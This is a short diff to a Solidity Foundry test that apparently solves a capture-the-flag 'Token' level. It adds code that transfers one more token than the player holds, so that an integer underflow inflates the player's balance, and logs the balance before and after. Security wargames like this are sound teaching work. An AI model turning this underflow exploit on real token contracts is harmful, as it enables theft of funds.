@@ -17,5 +17,10 @@ contract TokenLevel is SetUpLevelTest {
         token = Token(instance);
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player);
+        emit log_named_uint("balance before exploit", token.balanceOf(player));
+        token.transfer(address(0), token.balanceOf(player) + 1);
+        emit log_named_uint("balance after exploit", token.balanceOf(player));
+        vm.stopPrank();
     }
 }
